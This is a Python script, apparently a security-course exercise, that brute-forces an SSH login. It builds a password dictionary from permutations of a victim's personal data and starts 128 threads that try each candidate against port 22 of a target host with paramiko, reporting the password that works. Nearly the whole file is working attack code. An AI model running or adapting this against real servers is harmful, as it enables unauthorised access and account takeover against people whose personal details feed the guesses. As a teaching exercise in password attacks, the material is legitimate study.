from victimdata import *
import itertools
import paramiko
import sys
import threading

victim_passwd = ""
index = 0
lock = threading.Lock()

def job(passwd_list,maxlength):
    global victim_passwd
    global index
    while(True):
        if(victim_passwd != ""):
            break
        idx = 0
        lock.acquire()
        idx = index
        index += 1
        if(idx >= maxlength):
                break
        lock.release()

        trans = paramiko.Transport((sys.argv[1],  22))
        try:
            trans.connect(username="csc2021",  password=passwd_list[idx])
        except paramiko.AuthenticationException:
            trans.close()
            print("password: %-40s is UNsuccessful" % passwd_list[idx])
        else:
            print("Successful 🤖️🤖️🤖️ ! password is : %s" %
                  passwd_list[idx])
            victim_passwd = passwd_list[idx]

class dictionary():
    
    passwd = []
    data   = victim_data

    def __init__(self):
        for i in range(1,len(victim_data)):
            for j in itertools.permutations(self.data, i):
                str = ""
                for k in j:
                    str += k
                self.passwd.append(str)

    def print_passwd(self):
        for i in self.passwd:
            print(i)
        
    def attack(self):
        threads = []
        for i in range(128):
            threads.append(threading.Thread(target=job,args=(self.passwd,len(self.passwd))))
            threads[i].start()
        
        while(True):
            if(victim_passwd!=""):break
        
        print("NICE! Cracking Successfully")
        for i in range(128):
            threads[i].join()
        return victim_passwd

    

if __name__ == "__main__":
    dict = dictionary()
    dict.print_passwd()
